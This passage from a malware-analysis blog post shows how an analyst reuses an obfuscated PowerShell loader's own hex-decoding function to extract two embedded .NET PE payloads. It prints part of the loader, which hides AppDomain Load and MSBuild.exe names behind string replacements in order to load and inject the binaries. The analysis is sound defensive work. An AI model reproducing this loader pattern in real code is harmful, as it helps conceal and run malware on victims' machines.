</span><span class="nv">$A4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Lo!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'</span><span class="p">,</span><span class="s1">'ad'</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="nv">$a7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="w">
</span><span class="nv">$a5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'[S!!!!!!!!!!!!!!@@@@@@@@@@@@@@!!!!!!!!!!!!!!!!^^^^^^^^^^^^^in]'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'!!!!!!!!!!!!!!@@@@@@@@@@@@@@!!!!!!!!!!!!!!!!^^^^^^^^^^^^^'</span><span class="p">,</span><span class="s1">'ystem.AppDoma'</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">g</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$a5</span><span class="o">.</span><span class="nv">$A1</span><span class="p">(</span><span class="nv">$A2</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nv">$A3</span><span class="p">(</span><span class="nv">$a7</span><span class="p">,</span><span class="bp">$null</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nv">$A4</span><span class="p">([</span><span class="n">Byte</span><span class="p">[]](</span><span class="n">HBankers</span><span class="w"> </span><span class="p">(</span><span class="nv">$HL</span><span class="w">  </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="o">|</span><span class="w"> </span><span class="n">g</span><span class="w">
</span><span class="nv">$a8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'MS&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;.........e'</span><span class="o">.</span><span class="nf">Replace</span><span class="p">(</span><span class="s1">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;.........'</span><span class="p">,</span><span class="s1">'Build.ex'</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="nv">$HH</span><span class="o">=</span><span class="w"> </span><span class="n">HBankers</span><span class="w"> </span><span class="nv">$TC</span><span class="w">

</span><span class="p">[</span><span class="n">rerup</span><span class="p">]::</span><span class="n">qw5f0</span><span class="p">(</span><span class="nv">$a8</span><span class="p">,</span><span class="nv">$HH</span><span class="w"> </span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p>There’s a lot of fun obfuscation in this step of the chain, but I want to focus on two particular components: the hex strings starting with <code class="language-plaintext highlighter-rouge">4D5A</code>. The <code class="language-plaintext highlighter-rouge">4D5A</code> represents a traditional Windows PE header bytes that gets represented as <code class="language-plaintext highlighter-rouge">MZ</code> in ASCII. The script is shortened in this post for brevity, but examining it in <a href="https://www.virustotal.com/gui/file/ada2cd99438e9b05b8ed89dc36d4547f90436f5ef6fda2ece3c97b70b90d8bab">VirusTotal</a> will show the sample contains almost 200KB of encoded text. In addition, we can see there are two <code class="language-plaintext highlighter-rouge">Byte[]</code> array structures used by the code. We can hypothesize that the two hex strings decode into Windows PE files that will eventually be held inside those byte arrays. Now, how can we make that happen?</p><p>In both the <code class="language-plaintext highlighter-rouge">Byte[]</code> array statements, the adversary references the function <code class="language-plaintext highlighter-rouge">HBankers()</code>. In addition, the declaration for this function shows it takes string input and outputs a byte array. We can reasonably assume this function performs deobfuscation, so let’s use it to our advantage! We can use portions of the malware in our own script here:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$TC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"4D5A9\/\/\/\/3..."</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\/'</span><span class="p">,</span><span class="s1">'0'</span><span class="w"> </span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$HL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'4D5A9\/\/\/\/3...'</span><span class="o">.</span><span class="nf">replace</span><span class="p">(</span><span class="s1">'\/'</span><span class="p">,</span><span class="s1">'0'</span><span class="w"> </span><span class="p">)</span><span class="w">

</span><span class="kr">Function</span><span class="w"> </span><span class="nf">HBankers</span><span class="w"> </span><span class="p">{</span><span class="w">
 
    </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">(</span><span class="w"> </span><span class="p">)]</span><span class="w">
    </span><span class="p">[</span><span class="n">OutputType</span><span class="p">([</span><span class="n">byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">)]</span><span class="w">
    </span><span class="kr">param</span><span class="p">(</span><span class="w">
        </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="o">=</span><span class="bp">$true</span><span class="p">)]</span><span class="w"> </span><span class="p">[</span><span class="n">String</span><span class="p">]</span><span class="nv">$HLH</span><span class="w"> 
     </span><span class="p">)</span><span class="w">
    </span><span class="nv">$HHPPLL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="p">(</span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">)</span><span class="w">
    </span><span class="kr">for</span><span class="w"> </span><span class="p">(</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w"> </span><span class="nv">$i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$HHPPLL</span><span class="p">[</span><span class="nv">$i</span><span class="w"> </span><span class="n">/</span><span class="w"> </span><span class="nx">2</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToByte</span><span class="p">(</span><span class="nv">$HLH</span><span class="o">.</span><span class="nf">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="w"> </span><span class="nx">2</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="n">return</span><span class="w"> </span><span class="p">[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$HHPPLL</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="nv">$deobfuscated_bin_1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HBankers</span><span class="w"> </span><span class="nv">$TC</span><span class="w">
</span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="nv">$deobfuscated_bin_2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HBankers</span><span class="w"> </span><span class="nv">$HL</span><span class="w">

</span><span class="n">Set</span><span class="nt">-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="n">deobfuscated_1.bin</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$deobfuscated_bin_1</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w">
</span><span class="n">Set</span><span class="nt">-Content</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="n">deobfuscated_2.bin</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$deobfuscated_bin_2</span><span class="w"> </span><span class="nt">-AsByteStream</span><span class="w">
</span></pre></table></code></div></div><p>Now we can execute the script and then take a look at the files that get created:</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS /home/ForensicITGuy/NYAN&gt; file *.bin
deobfuscated_1.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
deobfuscated_2.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
</pre></table></code></div></div><p>And just like that, we have the PE binary payloads for additional analysis! The <code class="language-plaintext highlighter-rouge">HBanker()</code> function contained everything we needed to output a byte array into a variable, and <code class="language-plaintext highlighter-rouge">Set-Content</code> provided means for us to write that byte array to disk. Now that we have the files, we can continue analysis in the near future.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/malware/'>Malware</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/deobfuscation/" class="post-tag no-text-decoration" >deobfuscation</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/net/" class="post-tag no-text-decoration" >.net</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Smarter, Not Harder: Getting Malware to Help You Analyze It - Tony Lambert&amp;url=https://forensicitguy.github.io/smarter-not-harder-malware-analysis/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Smarter, Not Harder: Getting Malware to Help You Analyze It - Tony Lambert&amp;u=https://forensicitguy.github.io/smarter-not-harder-malware-analysis/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://forensicitguy.github.io/smarter-not-harder-malware-analysis/&amp;text=Smarter, Not Harder: Getting Malware to Help You Analyze It - Tony Lambert" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://forensicitguy.github.io/smarter-not-harder-malware-analysis/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/pecheck-malware-weight-loss/">Bad Guys Hate This Trick for Malware Weight Loss!</a><li><a href="/formbook-via-vbs-powershell-and-csharp/">Formbook Distributed Via VBScript, PowerShell, and C# Code</a><li><a href="/agenttesla-vba-certutil-download/">An AgentTesla Sample Using VBA Macros and Certutil</a><li><a href="/my-sans-dfir-netwars-experience/">My SANS DFIR NetWars Experience</a><li><a href="/making-meterpreter-look-google-signed/">Making Meterpreter Look Google Signed</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/formbook-via-vbs-powershell-and-csharp/"><div class="card-body"> <em class="timeago small" data-ts="1648166400" > 2022-03-25 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h3><div class="text-muted small"><p> Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbo...</p></div></div></a></div><div class="card"> <a href="/inspecting-powershell-cobalt-strike-beacon/"><div class="card-body"> <em class="timeago small" data-ts="1641686400" > 2022-01-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Inspecting a PowerShell Cobalt Strike Beacon</h3><div class="text-muted small"><p> In this post I want to take a look at a PowerShell-based Cobalt Strike beacon that appeared on MalwareBazaar. This particular beacon is representative of most PowerShell Cobalt Strike activity I se...</p></div></div></a></div><div class="card"> <a href="/hcrypt-injecting-bitrat-analysis/"><div class="card-body"> <em class="timeago small" data-ts="1642896000" > 2022-01-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HCrypt Injecting BitRAT using PowerShell, HTAs, and .NET</h3><div class="text-muted small"><p> One of my colleagues made a statement recently about how commonplace process injection has become among malware, to the point where it seems adversaries don’t have to think about the injection tech...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/rich-header-hashes-with-pefile/" class="btn btn-outline-primary" prompt="Older"><p>Getting PE Rich Header Hashes with pefile in Python</p></a> <a href="/analyzing-log4shell-muhstik/" class="btn btn-outline-primary" prompt="Newer"><p>Analyzing a Log4Shell log4j Exploit from Muhstik</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/msi/">msi</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/agenttesla/">agenttesla</a> <a class="post-tag" href="/tags/ld-preload/">ld_preload</a> <a class="post-tag" href="/tags/mshta/">mshta</a> <a class="post-tag" href="/tags/net/">.net</a> <a class="post-tag" href="/tags/cobalt-strike/">cobalt-strike</a> <a class="post-tag" href="/tags/csharp/">csharp</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-THRVSJGH6S"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-THRVSJGH6S'); }); </script>
